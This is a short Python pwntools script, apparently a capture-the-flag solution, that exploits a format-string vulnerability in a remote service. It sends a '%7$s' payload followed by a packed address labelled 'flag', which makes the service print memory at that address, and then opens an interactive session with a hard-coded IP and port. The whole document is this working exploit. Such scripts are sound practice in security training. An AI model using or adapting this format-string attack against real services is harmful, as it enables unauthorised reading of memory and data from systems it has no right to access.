# nc 13.214.30.13 10003

from pwn import *

flag = 0x0000000000404080

payload = b""
payload += b"1111%7$s"
payload += p64(flag)

print(payload)

p = remote("13.214.30.13", 10003)
p.recvuntil(b"?")
p.sendline(payload)
p.interactive()